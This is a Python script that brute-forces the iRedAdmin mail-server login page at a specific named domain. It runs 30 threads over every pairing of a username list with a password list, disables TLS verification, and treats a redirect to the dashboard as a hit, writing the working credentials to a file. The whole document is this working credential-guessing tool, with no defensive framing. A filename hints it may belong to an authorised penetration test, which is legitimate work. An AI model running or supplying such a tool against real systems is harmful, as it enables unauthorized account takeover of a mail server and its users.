import requests
import concurrent.futures
import urllib3
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://thepastamentors.com/iredadmin/login"

def check_creds(username, password):
    username = username.strip()
    password = password.strip()
    data = {"username": username, "password": password}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        # allow_redirects=False stops the cookie loop and lets us read the raw header
        res = requests.post(url, data=data, headers=headers, verify=False, allow_redirects=False, timeout=5)
        
        location = res.headers.get("Location", "")
        
        # If the server tries to send us to the dashboard, we win.
        if "dashboard" in location and "INVALID" not in location:
            print(f"\n[!!!!!!!!] GOD MODE SUCCESS [!!!!!!!!]")
            print(f"Username : {username}")
            print(f"Password : {password}")
            print(f"[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]\n")
            with open("WINNER.txt", "w") as f:
                f.write(f"{username}:{password}\n")
            return True
            
    except Exception:
        pass
    return False

if __name__ == "__main__":
    try:
        with open("master_usernames.txt", "r") as f:
            users = f.readlines()
        with open("roe_filtered_compliant.txt", "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[-] Missing input files. Ensure master_usernames.txt and roe_filtered_compliant.txt exist.")
        sys.exit(1)

    print(f"[*] Loaded {len(users)} users and {len(passwords)} compliant passwords.")
    print(f"[*] Firing precision Python strike. Please wait...\n")

    tasks = [(u, p) for u in users for p in passwords]
    
    # Thread pool for speed
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(check_creds, u, p) for u, p in tasks]
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                print("[*] Match found. Terminating script.")
                executor.shutdown(wait=False, cancel_futures=True)
                sys.exit(0)
